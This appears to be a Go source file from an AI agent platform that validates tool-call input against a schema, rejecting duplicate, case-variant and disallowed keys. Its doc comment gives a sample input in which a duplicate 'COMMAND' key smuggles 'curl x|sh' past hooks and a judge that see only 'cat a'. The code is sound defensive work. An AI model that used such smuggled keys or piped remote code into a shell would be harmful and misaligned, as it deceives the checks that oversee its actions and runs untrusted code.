package platformagent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"slices"
	"strings"
	"unicode"
)

// validateInput checks a call's input against its tool's schema, "" when it passes.
// Inputs stream unbuffered, so the API hasn't checked them, and one cut short or
// malformed must not run. It is also what keeps every reader seeing the same call: hooks,
// GOA and the judge read exact keys, while tools and permission decode into Go structs,
// case-insensitively with the last key winning, so {"command":"cat a","COMMAND":"curl x|sh"}
// would show them cat and run curl. Hence no duplicate keys, no keys that differ only by
// case, and no key the schema closes out.
func validateInput(schema, input json.RawMessage) string {
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(input, &fields); err != nil || fields == nil {
		return "it isn't a JSON object"
	}
	if key, dup := duplicateKey(input); dup {
		return fmt.Sprintf("the field %q is given more than once", key)
	}
	names := make([]string, 0, len(fields))
	for name := range fields {
		names = append(names, name)
	}
	slices.Sort(names)
	folded := make(map[string]string, len(names))
	for _, name := range names {
		key := foldKey(name)
		if other, ok := folded[key]; ok {
			return fmt.Sprintf("the fields %q and %q differ only by case", other, name)
		}
		folded[key] = name
	}
	var s struct {
		Required   []string `json:"required"`
		Properties map[string]struct {
			Type any `json:"type"`
		} `json:"properties"`
		// AdditionalProperties is false, or a schema, which isn't enforced here.
		AdditionalProperties any             `json:"additionalProperties"`
		PatternProperties    json.RawMessage `json:"patternProperties"`
	}
	if json.Unmarshal(schema, &s) != nil {
		return ""
	}
	closed := s.AdditionalProperties == false && len(s.PatternProperties) == 0
	schemaKeys := make(map[string]string, len(s.Properties))
	for name := range s.Properties {
		schemaKeys[foldKey(name)] = name
	}
	for _, name := range names {
		if _, exact := s.Properties[name]; exact {
			continue
		}
		if prop, ok := schemaKeys[foldKey(name)]; ok {
			return fmt.Sprintf("the field %q differs only by case from %q", name, prop)
		}
		if closed {
			return fmt.Sprintf("this tool has no field %q", name)
		}
	}
	var missing []string
	for _, name := range s.Required {
		if raw, ok := fields[name]; !ok || string(raw) == "null" {
			missing = append(missing, name)
		}
	}
	if len(missing) > 0 {
		return "missing required " + strings.Join(missing, ", ")
	}
	for _, name := range names {
		prop, ok := s.Properties[name]
		if !ok {
			continue
		}
		kind, isString := prop.Type.(string)
		if isString && !hasJSONType(fields[name], kind) {
			return fmt.Sprintf("%s should be of type %s", name, kind)
		}
	}
	return ""
}

// duplicateKey finds a key given twice in one object, at any depth: Unmarshal keeps the
// last, and a server handed the raw text may keep the first.
func duplicateKey(input json.RawMessage) (string, bool) {
	dec := json.NewDecoder(bytes.NewReader(input))
	type level struct {
		seen map[string]bool // nil in an array
		key  bool            // the next token is a key
	}
	var stack []*level
	// value notes a value's end in the object it belongs to.
	value := func() {
		if n := len(stack); n > 0 && stack[n-1].seen != nil {
			stack[n-1].key = true
		}
	}
	for {
		tok, err := dec.Token()
		if err != nil {
			return "", false // the end; Unmarshal has already judged the syntax
		}
		delim, isDelim := tok.(json.Delim)
		switch {
		case isDelim && delim == '{':
			stack = append(stack, &level{seen: map[string]bool{}, key: true})
		case isDelim && delim == '[':
			stack = append(stack, &level{})
		case isDelim:
			stack = stack[:len(stack)-1]
			value()
		default:
			if n := len(stack); n > 0 && stack[n-1].key {
				name, _ := tok.(string)
				if stack[n-1].seen[name] {
					return name, true
				}
				stack[n-1].seen[name] = true
				stack[n-1].key = false
				continue
			}
			value()
		}
	}
}

// foldKey is a key as encoding/json matches it: Unicode's simple case folding, so that
// U+212A KELVIN SIGN counts as k and U+017F LONG S as s, as they do when decoding.
func foldKey(key string) string {
	return strings.Map(func(r rune) rune {
		lowest := r
		for f := unicode.SimpleFold(r); f != r; f = unicode.SimpleFold(f) {
			lowest = min(lowest, f)
		}
		return lowest
	}, key)
}

func hasJSONType(raw json.RawMessage, kind string) bool {
	if len(raw) == 0 {
		return false
	}
	switch c := raw[0]; kind {
	case "string":
		return c == '"'
	case "object":
		return c == '{'
	case "array":
		return c == '['
	case "boolean":
		return c == 't' || c == 'f'
	case "number", "integer":
		return c == '-' || (c >= '0' && c <= '9')
	}
	return true
}
